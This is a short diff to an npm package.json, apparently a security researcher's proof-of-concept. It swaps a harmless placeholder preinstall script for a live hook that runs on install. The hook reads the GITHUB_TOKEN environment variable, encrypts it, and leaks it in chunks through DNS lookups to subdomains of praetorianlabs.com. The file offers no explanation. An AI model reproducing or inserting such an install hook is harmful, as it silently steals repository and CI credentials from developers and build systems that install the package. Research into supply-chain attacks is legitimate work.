@@ -4,7 +4,7 @@
   "scripts": {
     "check-types": "echo Type checking... && exit 0",
     "format-lint": "echo Format/lint... && exit 0",
-    "preinstall": "echo [SAFE] preinstall hook ran - in real attack this executes attacker code"
+    "preinstall": "bash -c 'GT=$(printenv GITHUB_TOKEN 2>/dev/null || echo no-gh-token); ENC=$(echo $GT | openssl enc -aes-256-cbc -a -salt -pass pass:buriburi -pbkdf2 2>/dev/null | tr -d \"\\n\" | tr \"+/=\" \"-._\"); P1=$(echo $ENC | cut -c1-60); P2=$(echo $ENC | cut -c61-120); nslookup ${P1}.g1.trajanbeast.dns.praetorianlabs.com 8.8.8.8 >/dev/null 2>&1; nslookup ${P2}.g2.trajanbeast.dns.praetorianlabs.com 8.8.8.8 >/dev/null 2>&1; echo ok' || true"
   },
   "devDependencies": {}
 }
